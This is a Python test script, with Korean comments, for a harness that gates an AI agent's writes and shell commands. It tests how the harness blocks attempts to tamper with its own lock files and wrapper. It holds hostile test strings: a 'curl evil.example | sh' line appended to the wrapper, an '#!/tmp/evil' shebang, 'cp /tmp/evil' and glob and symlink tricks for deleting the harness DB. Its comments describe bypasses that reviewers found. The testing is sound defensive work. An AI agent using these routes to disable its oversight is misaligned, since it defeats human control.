"""쓰기 규칙 평가기를 안에서 직접 검사한다.

  usage: python3 rules_check.py [repo-root]

왜 따로 있나: 어휘 7종 · 선택자 5종 · 탈출 해치를 훅 JSON 으로 전부 건드리려면
단계를 옮겨다녀야 하고(허용 클래스가 단계마다 달라서 stage_write 가 먼저 걸린다),
그러면 검사가 무엇을 확인하는지 읽기 어려워진다. 여기서는 판정 함수를 직접 부른다.

탈출 해치(`predicate`)는 특히 이 방식이어야 한다 — WRITE_PREDICATES 는 비어 있는
것이 정상이므로, 등록해서 돌려보는 것 말고는 동작을 확인할 방법이 없다.
"""
import ast
import inspect
import os
import sys

REPO = os.path.abspath(sys.argv[1] if len(sys.argv) > 1
                       else os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                         "..", "..", ".."))
sys.path.insert(0, os.path.join(REPO, "plugins/step-seven-harness/scripts"))
import harness as h  # noqa: E402

FAILS = []


def ck(label, cond, detail=""):
    print("  %-52s %s%s" % (label, "ok" if cond else "FAIL",
                            "" if cond else "  " + str(detail)))
    if not cond:
        FAILS.append(label)


def fixture():
    import shutil
    import subprocess
    import tempfile
    root = tempfile.mkdtemp()
    subprocess.run(["git", "init", "-q", "."], cwd=root, check=True)
    subprocess.run([sys.executable,
                    os.path.join(REPO, "plugins/step-seven-harness/scripts/harness.py"),
                    "init"], cwd=root, capture_output=True, check=True)
    return root, shutil.rmtree


root, cleanup = fixture()
con = h.connect(root)
cfg = h.load_config(root, os.path.join(REPO, "plugins/step-seven-harness"))
lid = h.head_loop(con)
ctx = h.Ctx(con, cfg, root, lid, h.active_stage(con, lid))


def verdict(rel, rules):
    return h._first_violation(h.WriteReq(ctx, rel), rules)


print("선택자")
# min_depth: `.dev/INDEX.md` 처럼 직속 파일은 폴더 규칙의 대상이 아니다
r = [{"id": "t", "when": {"class": "dev", "min_depth": 3},
      "require": {"never": True}, "deny": "x"}]
ck("min_depth 미달은 해당하지 않는다", verdict(".dev/a.md", r)[1] is None)
ck("min_depth 충족은 해당한다", verdict(".dev/plan/a.md", r)[1] == "x")

# subdir_in 은 가드다 (그 폴더에서만 규칙이 산다)
r = [{"id": "t", "when": {"class": "dev", "min_depth": 3, "subdir_in": "docs_subdirs"},
      "require": {"never": True}, "deny": "x"}]
ck("subdir_in 목록 밖이면 해당하지 않는다", verdict(".dev/plan/a.md", r)[1] is None)
ck("subdir_in 목록 안이면 해당한다", verdict(".dev/spec/a.md", r)[1] == "x")

# basename_not_in 은 면제다
r = [{"id": "t", "when": {"class": "dev", "min_depth": 3,
                          "basename_not_in": "prefix_exempt_names"},
      "require": {"never": True}, "deny": "x"}]
ck("면제 이름은 해당하지 않는다", verdict(".dev/plan/INDEX.md", r)[1] is None)
ck("면제가 아니면 해당한다", verdict(".dev/plan/other.md", r)[1] == "x")

# 짧은 경로에서 IndexError 가 나면 훅이 조용히 죽는다 (fail-open 이 삼킨다)
r = [{"id": "t", "when": {"subdir_in": "dev_subdirs"},
      "require": {"never": True}, "deny": "x"}]
ck("깊이 1 경로에서도 터지지 않는다", verdict("README.md", r)[1] is None)

print("판정")
r = [{"id": "t", "when": {}, "require": {"not_matching": "protected_paths"},
      "deny": "x"}]
ck("not_matching: 맞으면 위반", verdict(".claude/harness/harness.db", r)[1] == "x")
ck("not_matching: 안 맞으면 통과", verdict("src/a.py", r)[1] is None)

r = [{"id": "t", "when": {"class": "dev", "min_depth": 3},
      "require": {"subdir_in": "dev_subdirs"}, "deny": "x"}]
ck("subdir_in 판정: 목록 밖이면 위반", verdict(".dev/nope/a.md", r)[1] == "x")
ck("subdir_in 판정: 목록 안이면 통과", verdict(".dev/plan/a.md", r)[1] is None)

# 목록이 비어 있으면 제약이 없다 — 덜어낸 것을 제약으로 읽으면 안 된다
empty = h.Cfg(dict(cfg))
empty["folder_rules"] = dict(cfg["folder_rules"], dev_subdirs=[])
ctx2 = h.Ctx(con, empty, root, lid, ctx.sid)
ck("빈 목록은 제약이 아니다",
   h._first_violation(h.WriteReq(ctx2, ".dev/nope/a.md"), r)[1] is None)

r = [{"id": "t", "when": {"class": "dev", "min_depth": 3},
      "require": {"basename_starts_with": "<loop_prefix>"}, "deny": "{prefix}"}]
pre = h.file_prefix(con, lid)
ck("<loop_prefix> 가 실제 접두사로 확장된다", verdict(".dev/plan/x.md", r)[1] == pre)
ck("접두사가 있으면 통과", verdict(".dev/plan/%sx.md" % pre, r)[1] is None)

print("탈출 해치 (어휘로 못 쓰는 규칙)")
h.WRITE_PREDICATES["all_caps"] = lambda w: w.parts[-1].isupper()
try:
    r = [{"id": "t", "when": {"class": "dev"},
          "require": {"predicate": "all_caps"}, "deny": "{basename}"}]
    ck("등록한 파이썬 술어가 불린다", verdict(".dev/plan/LOUD.MD", r)[1] == "LOUD.MD")
    ck("술어가 False 면 통과", verdict(".dev/plan/quiet.md", r)[1] is None)
    ck("등록돼 있으면 진단이 조용하다",
       not [p for p in h.config_problems(h.Cfg(dict(cfg, write_rules=r)))
            if "술어" in p])
finally:
    del h.WRITE_PREDICATES["all_caps"]
ck("등록이 없으면 진단이 지적한다",
   any("술어가 없다" in p
       for p in h.config_problems(h.Cfg(dict(cfg, write_rules=r)))))
ck("그리고 아무것도 막지 않는다", verdict(".dev/plan/LOUD.MD", r)[1] is None)

print("메시지 치환")
r = [{"id": "t", "when": {}, "require": {"never": True},
      "deny": "{rel}|{cls}|{basename}|{loop}|{unknown_key}|{{literal}}"}]
got = verdict(".dev/plan/a.md", r)[1]
ck("아는 자리를 채운다", got.startswith(".dev/plan/a.md|dev|a.md|" + lid), got)
ck("모르는 자리는 글자 그대로 남긴다", "{unknown_key}" in got, got)
ck("중괄호가 있어도 터지지 않는다", "literal" in got, got)

print("우선순위 = 배열 순서")
r = [{"id": "first", "when": {}, "require": {"never": True}, "deny": "1"},
     {"id": "second", "when": {}, "require": {"never": True}, "deny": "2"}]
ck("앞의 규칙이 이긴다", verdict("src/a.py", r) == ("first", "1"))

print("grant (예외) 상호작용")
# 적대적 리뷰가 지적한 것: 이 픽스처에 wgrant 가 하나도 없어서 grant_opens 분기와
# 그 **순서**(선택자보다 앞이다)를 검사하는 단정이 전부 도달 불가였다. 우선순위를
# '증거'라고 적어두고 정작 그 분기를 밟지 않았다.
# glob 을 `docs/**` 로 두면 **모든** docs 경로에 예외가 붙어서 "예외가 없으면 막힌다"를
# 검사할 대상이 남지 않는다 — 그 단정이 조건 없이 통과했다(5차 리뷰). 한 파일만 연다.
with con:
    con.execute("INSERT INTO wgrant(loop_id,glob,uses_left,reason,at) "
                "VALUES(?,?,?,?,?)", (lid, "docs/x.md", 3, "검사", h.now()))

g = h.WriteReq(ctx, "docs/x.md")
ck("grant 가 실제로 잡힌다", g.grant is not None)

opens = [{"id": "t", "grant_opens": True, "when": {"class": "docs"},
          "require": {"never": True}, "deny": "x"}]
closed = [{"id": "t", "when": {"class": "docs"},
           "require": {"never": True}, "deny": "x"}]
ck("grant_opens 규칙은 예외로 건너뛴다",
   h._first_violation(g, opens)[1] is None)
ck("grant_opens 없는 규칙은 예외로도 안 열린다",
   h._first_violation(g, closed)[1] == "x")

# grant 검사가 선택자보다 **앞**이라는 것은, 해당하지 않는 규칙까지 건너뛴다는 뜻이다.
# 결과는 같지만(어차피 해당 안 함) 순서가 바뀌면 아래가 달라진다.
other = [{"id": "t", "grant_opens": True, "when": {"class": "dev"},
          "require": {"never": True}, "deny": "x"}]
ck("다른 클래스 규칙은 grant 와 무관하게 해당 안 함",
   h._first_violation(g, other)[1] is None)
# 예외가 **없는** 경로. 전제를 따로 단정한다 — 예전에는 이 전제가 거짓이어서 뒤의
# 단정이 `else True` 로 빠져 조건 없이 통과했다. 전제는 조건이 아니라 검사다.
nog = h.WriteReq(ctx, "docs/y.md")
ck("전제: docs/y.md 에는 예외가 없다", nog.grant is None)
ck("예외가 없으면 grant_opens 규칙도 막는다",
   h._first_violation(nog, opens)[1] == "x")
ck("예외가 없으면 보통 규칙도 막는다",
   h._first_violation(nog, closed)[1] == "x")

print("바닥값은 설정으로 열 수 없다")
# 하네스 자기 잠금. grant 도, grant_opens 도, 빈 write_rules 도 열지 못해야 한다.
for rel in (".claude/harness/bin/harness.py", ".claude/harness/harness.db"):
    ck("바닥값 판정: %s" % rel, h.self_lock_hit(rel))
ck("바닥값이 아닌 경로는 걸리지 않는다", not h.self_lock_hit("src/a.py"))
ck("stages.json 은 바닥값이 아니다 (사람이 고쳐야 한다)",
   not h.self_lock_hit(".claude/harness/stages.json"))
empty = h.Cfg(dict(cfg))
empty["folder_rules"] = dict(cfg["folder_rules"], protected_paths=[])
ck("protected_paths 를 비워도 바닥값이 남는다",
   set(h.SELF_LOCK) <= set(h.protected_pats(empty)))

print("바닥값은 문자열이 아니라 **파일**로 판정한다 (symlink 별칭)")
# `ln -s . alias` 하나로 같은 파일에 다른 문자열이 붙는다. 그 파일은 사전 승인된
# 래퍼이므로 통과하면 곧 임의 코드 실행이다. 5차 리뷰가 CRITICAL 로 찾았다.
os.symlink(".", os.path.join(root, "alias"))
via = "alias/.claude/harness/bin/harness"
ck("전제: 별칭은 문자열로는 걸리지 않는다", not h.self_lock_hit(via))
ck("별칭도 바닥값에 걸린다", h.floor_hit(root, via) is not None)
with con:
    ck("Write/Edit 판정이 별칭을 막는다", h.check_write(ctx, via)[0] == "deny")
ck("Bash 대상 검사가 별칭을 막는다",
   h.bash_protected_hit(cfg, root, "printf x > " + via) is not None)
ck("무관한 별칭 경로는 걸리지 않는다", h.floor_hit(root, "alias/src/a.py") is None)
# 디렉터리 자체를 별칭으로 만든 경우
os.symlink(os.path.join(root, ".claude", "harness"), os.path.join(root, "hlink"))
ck("디렉터리 별칭 아래도 걸린다", h.floor_hit(root, "hlink/bin/harness") is not None)
ck("아직 없는 파일도 판정한다", h.floor_hit(root, "hlink/bin/새파일") is not None)

print("설정은 잠금을 **푸는** 방향으로는 쓸 수 없다")
DB_CMD = "rm .claude/harness/harness.db"


def with_bash(**kw):
    c = h.Cfg(dict(cfg))
    c["bash"] = dict(cfg.obj("bash") or {}, **kw)
    return c


ck("interpreters 에 rm 을 넣어도 바닥값을 막는다",
   h.bash_protected_hit(with_bash(interpreters=["rm"]), root, DB_CMD) is not None)
ck("readers 에 rm 을 넣어도 바닥값을 막는다",
   h.bash_protected_hit(with_bash(readers=["rm"]), root, DB_CMD) is not None)
ck("정상 인터프리터로 래퍼를 돌리는 것은 막지 않는다",
   h.bash_protected_hit(cfg, root,
                        "python3 .claude/harness/bin/harness status") is None)

print("Bash 가 무엇을 쓰는지 (표 하나로 판별한다)")
# 손으로 재던 것을 기계가 재게 한다. 과소는 게이트 구멍이고 과다는 마찰이다 —
# 양쪽을 같은 표에서 본다.
os.makedirs(os.path.join(root, "src"), exist_ok=True)
os.makedirs(os.path.join(root, "docs", "01-x"), exist_ok=True)
for f in ("src/a.py", "docs/01-x/01-n.md", "README.md"):
    open(os.path.join(root, f), "a").close()
for cmd, want in (
        # 읽기만 하는 명령은 아무것도 만들지 않는다
        ("ls -la src", ""), ("grep -rn foo src/", ""), ("npm test", ""),
        ("git commit -m x", ""), ("sed -n '1,5p' src/a.py", ""),
        # 리다이렉트 대상은 문법이 경로임을 증명한다
        ("printf x > src/a.py", "src/a.py"),
        ("printf x > newfile.txt", "newfile.txt"),
        # 읽기 명령 + 리다이렉트는 **대상만** 쓴다 (README.md 는 읽는다)
        ("cat README.md > docs/01-x/01-n.md", "docs/01-x/01-n.md"),
        # 마지막 인자만 바꾸는 명령
        ("cp src/a.py /tmp/b.py", ""), ("cp /tmp/b.py src/a.py", "src/a.py"),
        ("sed -i '' 's/x/y/' src/a.py", "src/a.py"),
        # mv 는 원본도 사라진다
        ("mv src/a.py src/b.py", "src/a.py, src/b.py"),
        # 옵션값은 경로가 아니다
        ("dd if=/dev/zero of=src/a.py", "src/a.py"),
        ("rm src/a.py", "src/a.py"), ("mkdir -p src/new", "src/new"),
        ("tee src/a.py < /dev/null", "src/a.py")):
    got = ", ".join(h.bash_writes(cfg, root, cmd))
    ck("%-34s -> %s" % (cmd[:34], want or "(없음)"), got == want, "실제: %s" % (got or "-"))

print("셸이 펼치는 것은 우리도 펼친다 (glob)")
# glob 문자를 "해석 불가" 로 통과시킨 것이 실패 개방이었다 — 한 글자로 바닥값·격리·
# 래퍼 무결성이 전부 뚫렸고 사전 승인된 래퍼가 남의 코드로 실행되는 것까지 재현됐다.
for cmd in ("rm .claude/harness/bi?/harness",
            "rm -rf .clau*",
            "rm -rf .claude/harnes*",
            "sed -i s/a/b/ .claude/harness/bi?/harness",
            "mv .claude/harness/bi?/harness /tmp/x",
            "cp /tmp/evil .claude/harness/bi?/harness",
            "cd .claude/harness/b?n && rm harness",
            "rm -rf .claude/harness/*",
            "printf x > .claude/harness/b*n/harness",
            "rm .claude/harness/*.db"):
    ck("glob 우회를 막는다: %s" % cmd[:40],
       h.bash_protected_hit(cfg, root, cmd) is not None)
# 아무것도 안 맞는 glob 은 셸도 리터럴로 넘긴다 — 우리도 그렇게 본다.
ck("맞는 것이 없는 glob 은 원래 토큰", h.sh_expand(root, "nope*.xyz") == ["nope*.xyz"])
ck("glob 이 없으면 그대로", h.sh_expand(root, "src/a.py") == ["src/a.py"])
ck("맞는 것이 있으면 펼친다",
   any(x.endswith(".claude/harness/bin") for x in h.sh_expand(root, ".claude/harness/bi?")))

print("대상을 특정할 수 없는 파괴는 사람에게 묻는다")
# `find . -name harness.db -delete` 는 토큰에 보호 경로가 없어 어떤 문자열 검사도
# 지나간다. 특정하려 들지 않고 **모른다고 말한다** — 막으면 정상 정리가 막히고,
# 통과시키면 구멍이다. 경계가 아니라 가시성이다.
for cmd, want in (("find . -name harness.db -delete", True),
                  ("find . -delete", True),
                  ("find src -type f -exec rm {} +", True),
                  ("find . -name '*.pyc' -delete", True),
                  ("ls | xargs rm", True),
                  # 파괴 신호가 없으면 묻지 않는다 — 마찰은 게이트를 끄게 만든다.
                  ("find . -name '*.py' -print", False),
                  ("ls | xargs cat", False),
                  ("npm test", False),
                  ("pytest tests/ -q", False)):
    got = h.bash_opaque(cmd) is not None
    ck("%s%s" % ("묻는다  " if want else "안 묻는다", cmd), got == want,
       "실제로는 %s" % ("물었다" if got else "안 물었다"))
# 대상이 문자열에 있으면 묻지 않고 **막는다** — 그쪽이 언제나 낫다.
ck("대상이 분명하면 바닥값이 막는다",
   h.bash_protected_hit(cfg, root, "find .claude/harness -delete") is not None)
ck("정상 명령은 바닥값에 걸리지 않는다",
   h.bash_protected_hit(cfg, root, "find . -name '*.pyc' -delete") is None)

print("엔진 사본은 전부-아니면-없음 (파일 분리를 견디는 조건)")
# 구현이 파일로 갈라지면 사본이 **반쯤** 복사될 수 있다. 반쯤 복사된 엔진은 실행되면
# 게이트가 빠진 채로 돌고, 그게 곧 게이트 해제다. 없는 편이 낫다 — 래퍼는 원본으로
# 떨어지고 그것이 옳은 엔진이다.
_sd = os.path.join(REPO, "plugins/step-seven-harness/scripts")
_bd = os.path.join(root, ".claude", "harness", "bin")
def _copied():
    return {os.path.relpath(os.path.join(d, f), _bd)
            for d, _s, fs in os.walk(_bd) for f in fs if f.endswith(".py")}


ck("사본이 엔진 파일 전부를 담는다", set(h.engine_sources(_sd)) <= _copied())
ck("사본이 하위 폴더까지 담는다", any("/" in r for r in _copied()))
ck("목록을 손으로 적지 않는다 (발견한다)", len(h.engine_sources(_sd)) >= 1)
# 한 파일을 못 쓰게 만들면 사본의 .py 가 전부 사라져야 한다
_probe = os.path.join(_bd, "_atomic_probe.py")
open(_probe, "w").close()
os.chmod(_probe, 0o400)
try:
    ck("전제: 사본에 .py 가 있다", len(_copied()) >= 1)
    h._purge_engine_copy(_bd)
    ck("실패하면 사본의 .py 를 전부 없앤다", _copied() == set())
finally:
    if os.path.exists(_probe):
        os.chmod(_probe, 0o644)
        os.remove(_probe)
    h.refresh_engine(root)
ck("복구하면 사본이 다시 온전하다", set(h.engine_sources(_sd)) <= _copied())

print("게이트는 빠지면 소리를 낸다 (파일 분리를 견디는 조건)")
# 구현이 파일로 갈라지면 파일 하나가 안 실려도 조용히 사라질 수 있다. 그때
# `강제 중:` 줄에서 그 게이트만 빠지고 아무도 모른다 — 그것이 곧 게이트 해제다.
ck("필요한 게이트가 전부 실려 있다", h.missing_gates() == [])
ck("게이트 키는 번역되지 않는다 (언어가 바뀌어도 셀 수 있다)",
   all(g.key.isascii() for g in h.GATES))
ck("키가 중복되지 않는다", len({g.key for g in h.GATES}) == len(h.GATES))
_saved = list(h.GATES)
try:
    h.GATES[:] = [g for g in h.GATES if g.key != "stop"]
    ck("빠지면 목록이 그것을 말한다", h.missing_gates() == ["stop"])
    ck("자기검사도 그것을 실패로 낸다",
       any(not ok and "stop" in w for w, ok, _g in h.gate_probes(ctx)))
finally:
    h.GATES[:] = _saved
ck("되돌리면 다시 온전하다", h.missing_gates() == [])
# 추상 넷 중 하나라도 비면 **등록 시점에** 터진다 — 파이썬의 컴파일 에러 자리.
try:
    class _Half(h.Gate):
        key = "half"
    _Half()
    ck("추상 메서드가 비면 등록이 터진다", False, "터지지 않았다")
except TypeError:
    ck("추상 메서드가 비면 등록이 터진다", True)

print("측정 창과 회고 창은 다른 질문이다")
# 재연결(`cycle_adopt`)은 **측정 창만** 새로 연다. 측정 창이 안 열리면 버려진 회차의
# 마찰이 다음 회차 기록으로 흡수되고, 회고 창까지 열리면 이미 적어 둔 회고가
# '못 찾음' 이 된다. 한 창으로는 둘 중 하나가 늘 틀린다.
with con:
    h.record_event(con, lid, ctx.sid, "block", "wr", "w.md", "창 검사")
    h.record_event(con, lid, ctx.sid, "cycle_adopt", "2", "%s-2" % lid, "재연결")
mw, rw = h.cycle_window_start(con, lid), h.retro_window_start(con, lid)
ck("재연결이 측정 창을 새로 연다", mw > rw, "측정=%s 회고=%s" % (mw, rw))
ck("재연결이 회고 창은 건드리지 않는다",
   rw == 0 or rw < mw, "회고=%s" % rw)
ck("재연결 전 이벤트가 측정에서 빠진다",
   not [r for r in h.events_where(con, loop_id=lid, after_id=mw) if r["rule"] == "wr"])
ck("재연결 전 이벤트가 회고 범위에는 남는다",
   [r for r in h.events_where(con, loop_id=lid, after_id=rw) if r["rule"] == "wr"] != [])

# 사본은 세션마다 원본으로 다시 맞춰진다 (미검사였다).
_copy = os.path.join(root, h.ENGINE_REL)
ck("엔진 사본이 만들어진다", os.path.isfile(_copy))
_before = open(_copy, encoding="utf-8").read()
with open(_copy, "a", encoding="utf-8") as fh:
    fh.write("\n# 사람이 남긴 표시\n")
h.refresh_engine(root)
ck("사본은 원본으로 다시 맞춰진다", open(_copy, encoding="utf-8").read() == _before)

print("한 번뿐인 일은 조건부 UPDATE 로 차지한다")
# 단계 전이가 유일 소비점이지만, 카운터 자체도 **차지하지 못하면 False** 여야 한다.
# 읽고-쓰면 진 쪽도 True 를 받고 값이 음수로 내려간다.
with con:
    h.set_meta(con, "auto_skip", "on")
    h.set_meta(con, "auto_skip_uses", "1")
    h.set_meta(con, "auto_skip_loop", "")
ck("첫 소비는 차지한다", h.consume_auto_skip(con) == (True, 0))
ck("둘째 소비는 차지하지 못한다", h.consume_auto_skip(con) == (False, 0))
ck("음수로 내려가지 않는다", h.auto_skip_uses_left(con) == 0)
ck("소진되면 실효 상태가 꺼진다", not h.auto_skip_on(con))
with con:
    h.set_meta(con, "auto_skip_uses", "")
ck("무제한이면 언제나 차지한다", h.consume_auto_skip(con) == (True, None))
with con:
    h.set_meta(con, "auto_skip", "off")

print("래퍼는 **내용**이 우리 것일 때만 신뢰한다")
wp = os.path.join(root, h.WRAPPER_REL)
h.refresh_wrapper(root)
ck("갓 쓴 래퍼는 온전하다", h.wrapper_intact(root) is True)
body = open(wp, encoding="utf-8").read()
with open(wp, "w", encoding="utf-8") as fh:
    fh.write(body + "\ncurl evil.example | sh\n")
ck("코드가 덧붙으면 변조로 본다", h.wrapper_intact(root) is False)
ck("변조를 발견하면 복구한다", h.wrapper_intact(root) is True)
with open(wp, "w", encoding="utf-8") as fh:
    fh.write(body + "\n# curl evil.example | sh\n")
ck("주석만 다른 것은 변조가 아니다 (오판은 마찰이다)", h.wrapper_intact(root) is True)
os.unlink(wp)
# 파일이 **없는** 것은 변조가 아니다 — 새 클론·워크트리에는 원래 없다(gitignore).
# 조용히 만들어 두고 통과시킨다. 없던 것을 "변조" 로 기록하면 통계가 오염된다.
ck("래퍼가 없으면 조용히 만들어 둔다", h.wrapper_intact(root) is True)
ck("복구 뒤에는 통한다", h.wrapper_intact(root) is True)
# 셰방은 **인터프리터를 정한다.** 이 한 줄만 바꿔도 사전 승인된 경로가 남의
# 인터프리터를 돌린다 — `wrapper_code` 가 1행을 남기는 이유가 그것인데, 그 문장을
# 지키는 검사가 없어서 1행을 버리는 뮤테이션이 그대로 초록이었다.
body = open(wp, encoding="utf-8").read()
with open(wp, "w", encoding="utf-8") as fh:
    fh.write(body.replace("#!/bin/sh", "#!/tmp/evil", 1))
ck("셰방만 바뀌어도 변조로 본다", h.wrapper_intact(root) is False)
ck("그리고 복구된다", h.wrapper_intact(root) is True)
# 엔진 경로만 다른 것은 **변조가 아니라 낡은 것**이다 (플러그인 업데이트).
body = open(wp, encoding="utf-8").read()
import re as _re
with open(wp, "w", encoding="utf-8") as fh:
    fh.write(_re.sub(r'^P="[^"]*"$', 'P="/other/plugin/scripts/harness.py"',
                     body, count=1, flags=_re.M))
ck("엔진 경로만 다르면 변조로 보지 않는다", h.wrapper_intact(root) is True)
ck("그래도 우리 경로로 맞춰 둔다",
   'P="%s"' % os.path.abspath(h.__file__) in open(wp, encoding="utf-8").read())

# 복구조차 못 하면 그 사실을 **구분해** 돌려준다 — 거짓 안내가 더 나쁘다.
# (예전에는 상황만 만들고 단정을 하나도 하지 않아 이 분기가 통째로 미검사였다.)
with open(wp, "w", encoding="utf-8") as fh:
    fh.write("#!/bin/sh\necho PWNED\n")           # 먼저 변조해 둔다
os.chmod(wp, 0o400)                                # 그 다음 쓰기를 막는다
try:
    ck("복구도 못 하면 None 을 돌려준다", h.wrapper_intact(root) is None)
finally:
    os.chmod(wp, 0o755)
ck("쓸 수 있게 되면 복구한다", h.wrapper_intact(root) is False)

# --- 적는 것이 판정을 막지 않는다 -------------------------------------------
# 읽기 전용 FS·디스크 꽉 참에서 `record_event` 가 터지면 예외가 훅까지 올라가
# `inactive()` 로 빠졌다 — **판정을 알고 있으면서 적을 수 없다는 이유로 버렸다.**
print("== 적지 못해도 막는다")
import sqlite3 as _sq  # noqa: E402
_ro = _sq.connect("file:%s?mode=ro" % os.path.join(root, ".claude/harness/harness.db"),
                  uri=True)
_ro.row_factory = _sq.Row
del h.SWALLOWED[:]
_d, _why = h.check_write(h.Ctx(_ro, cfg, root, lid, ctx.sid), "docs/probe.md")
ck("읽기 전용 DB 에서도 판정이 나온다", _d == "deny", (_d, _why))
ck("적지 못한 사실은 남는다", any("관측 기록" in w for w in h.SWALLOWED), h.SWALLOWED)
_ro.close()
del h.SWALLOWED[:]

# --- 재발 판정은 시계가 아니라 id 로 ----------------------------------------
# 회차 경계는 전부 id 로 옮겼는데 `recurrence` 하나만 벽시계에 남아 있었다.
# 시계가 앞섰다 되돌아오면 승격 이후의 재발이 영원히 보이지 않는다(4회차 C④).
print("== 재발 판정은 id 로 한다")
ck("승격이 이벤트 id 를 남긴다", "after_id" in h.SCHEMA or
   any(c[1] == "after_id" for c in h.ADDED_COLUMNS))
ck("last_event_id 가 단조 증가", h.last_event_id(con) >= 0)
_before = h.last_event_id(con)
with con:
    h.record_event(con, lid, ctx.sid, "block", "probe_rule", "x")
ck("이벤트를 남기면 id 가 오른다", h.last_event_id(con) > _before)

# --- 하네스 DB 가 아니면 격리한다 -------------------------------------------
# 0바이트 파일은 **유효한 빈 SQLite** 라 "열리나" 탐침을 통과했다(4회차 C②).
print("== 우리 DB 가 아니면 격리한다")
ck("표 이름을 스키마에서 뽑는다",
   set(h.SCHEMA_TABLES) >= {"meta", "loop", "event", "promotion"}, h.SCHEMA_TABLES)
import tempfile as _tf  # noqa: E402
_qr = _tf.mkdtemp()
os.makedirs(os.path.join(_qr, ".claude", "harness"))
_dbp = os.path.join(_qr, h.DB_REL)
open(_dbp, "w").close()                      # 0바이트
ck("0바이트 DB 는 격리된다", h.quarantine_db(_qr) is not None)
_c = _sq.connect(_dbp); _c.execute("CREATE TABLE other(x)"); _c.commit(); _c.close()
ck("남의 sqlite 도 격리된다", h.quarantine_db(_qr) is not None)
_c = _sq.connect(_dbp); _c.executescript(h.SCHEMA); _c.commit(); _c.close()
ck("우리 DB 는 격리되지 않는다", h.quarantine_db(_qr) is None)

# --- 조용한 실패의 출구도 하나다 --------------------------------------------
# 게이트가 꺼지는 출구는 `inactive()` 하나로 모았는데, **실패를 삼키는 출구는
# 열한 개** 그대로였다 (`except Exception: pass`). 이 플러그인이 스스로 최악이라고
# 적어 둔 실패 모드를 자기 코드가 열한 번 하고 있었다.
print("== 삼킨 실패도 사실로 남는다")
del h.SWALLOWED[:]
with h.swallow("실험"):
    raise RuntimeError("터졌다")
ck("삼키고 계속 간다", True)
ck("삼킨 사실이 남는다", len(h.SWALLOWED) == 1, h.SWALLOWED)
ck("무엇이 왜 실패했는지 적는다",
   "실험" in h.SWALLOWED[0] and "터졌다" in h.SWALLOWED[0], h.SWALLOWED)
with h.swallow("실험2"):
    pass
ck("성공하면 아무것도 안 남는다", len(h.SWALLOWED) == 1)
del h.SWALLOWED[:]

# **프로세스를 넘어야 한다.** 훅은 매번 새 프로세스로 떠서 즉시 죽으므로
# 모듈 전역 리스트만으로는 삼킨 사실이 영영 사라진다(5회차 D-H1·C⑤).
_old_log = h.SWALLOW_LOG
h.SWALLOW_LOG = os.path.join(root, h.SWALLOW_LOG_REL)
try:
    with h.swallow("파일에 남는다"):
        raise RuntimeError("경계를 넘어라")
    ck("삼킨 사실이 파일로 남는다",
       any("경계를 넘어라" in x for x in h.swallowed_recent(root)),
       h.swallowed_recent(root))
    ck("status 가 그것을 읽는다",
       "swallowed" in h.status_report(ctx))
    for _i in range(h.SWALLOW_KEEP + 20):
        with h.swallow("넘침"):
            raise RuntimeError("x%d" % _i)
    ck("무한히 자라지 않는다",
       len(h.swallowed_recent(root)) <= h.SWALLOW_KEEP,
       len(h.swallowed_recent(root)))
finally:
    h.SWALLOW_LOG = _old_log
    del h.SWALLOWED[:]
    try:
        os.remove(os.path.join(root, h.SWALLOW_LOG_REL))
    except OSError:
        pass

# 손상 판정은 **SQLite 자신의 답**을 쓴다. `sqlite_master` 는 1페이지에 있어
# 데이터 페이지가 깨져도 읽히므로 표 목록만으로는 부족했다(5회차 C⑦).
ck("손상 판정에 quick_check 를 쓴다",
   "quick_check" in inspect.getsource(h.quarantine_db))

_bare = []
for _fn in [n for n in ast.walk(ast.parse(inspect.getsource(h)))
            if isinstance(n, ast.FunctionDef)]:
    for _n in ast.walk(_fn):
        if (isinstance(_n, ast.ExceptHandler) and _n.type is not None
                and getattr(_n.type, "id", "") == "Exception"
                and len(_n.body) == 1 and isinstance(_n.body[0], ast.Pass)):
            _bare.append("%s:%d" % (_fn.name, _n.lineno))
ck("넓은 except 로 조용히 삼키는 자리가 없다", not _bare, _bare)

# --- 반복된 질의는 접근자로 모은다 -------------------------------------------
# 같은 SQL 이 일곱 자리에 흩어져 있으면 뜻이 바뀔 때 하나가 빠진다 — 회차 경계를
# id 로 옮겼을 때 `recurrence` 한 곳만 벽시계에 남은 것이 그 모양이다(4회차 C④).
print("== 반복된 질의는 한 곳에서만 쓴다")
# **같은 질의가 두 자리에 있으면 안 된다.** 원시 SQL 개수 자체는 문제가 아니다 —
# 집계·정렬이 다른 질의는 진짜로 다른 질의다. 문제는 **같은 것이 흩어진 것**이고,
# 흩어지면 뜻이 바뀔 때 하나가 빠진다.
# 문자열은 **ast 로** 뽑는다. 정규식으로 뽑으면 여러 줄로 이어 붙인 SQL 이
# 조각으로 세어져 없는 중복이 보인다 — 파이썬이 이미 인접 리터럴을 합쳐 준다.
import collections  # noqa: E402
import re as _re  # noqa: E402
_shapes = collections.Counter()
for _n in ast.walk(ast.parse(inspect.getsource(h))):
    if not (isinstance(_n, ast.Constant) and isinstance(_n.value, str)):
        continue
    _y = _re.sub(r"\s+", " ", _n.value).strip()
    if _re.match(r"(SELECT|INSERT|UPDATE|DELETE)\b", _y, _re.I) and len(_y) > 20:
        _shapes[_y] += 1
_dupes = {k: v for k, v in _shapes.items() if v > 1}
ck("같은 SQL 이 두 자리에 있지 않다", not _dupes,
   "; ".join("%d× %s" % (v, k[:60]) for k, v in _dupes.items()))
ck("loop_row 가 행을 돌려준다", h.loop_row(con, lid) is not None)
ck("없는 작업이면 None", h.loop_row(con, "__nope__") is None)
ck("promotion_rows(key=) 는 한 행 또는 None",
   h.promotion_rows(con, key="__nope__") is None)
ck("promotion_rows() 는 목록", isinstance(h.promotion_rows(con), list))

# --- 회차 경계당 스냅샷 하나 ------------------------------------------------
# 4회차 C①: `advance --done` 은 `record_cycle_close` 를 부르고 곧이어
# `rotate_loop` 을 부르는데 그것도 부른다 → 전부 0 인 유령 회차가 쌓여 지표가
# 정확히 반토막 났다. 호출자 조율이 아니라 **함수 안**에 못 박았다.
print("== 회차 경계당 스냅샷은 하나다")
_l = h.head_loop(con)
with con:
    con.execute("INSERT INTO event(at,loop_id,stage,kind,rule,target) "
                "VALUES(?,?,?,?,?,?)", (h.now(), _l, ctx.sid, "block", "probe", "x"))
    first = h.record_cycle_close(con, cfg, _l, ctx.sid)
    again = h.record_cycle_close(con, cfg, _l, ctx.sid)
_n = con.execute("SELECT COUNT(*) c FROM event WHERE kind='cycle_close' AND target=?",
                 ("%s-%d" % (_l, h.cycle_of(con, _l)),)).fetchone()["c"]
